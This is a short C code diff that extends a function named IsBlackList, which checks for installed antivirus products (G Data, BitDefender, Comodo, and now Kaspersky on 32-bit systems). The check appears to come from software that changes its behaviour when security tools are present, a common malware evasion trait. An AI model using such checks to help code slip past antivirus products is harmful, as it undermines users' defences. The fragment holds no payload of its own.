@@ -839,7 +839,7 @@ BOOL IsGData()
 
 BOOL IsBlackList()
 {
-	if (IsGData() || IsBitDefenderAVPlus() || IsComodo3())
+	if (IsGData() || IsBitDefenderAVPlus() || IsComodo3() || (IsKaspersky() && !IsX64System()))
 		return TRUE;
 	return FALSE;
 }
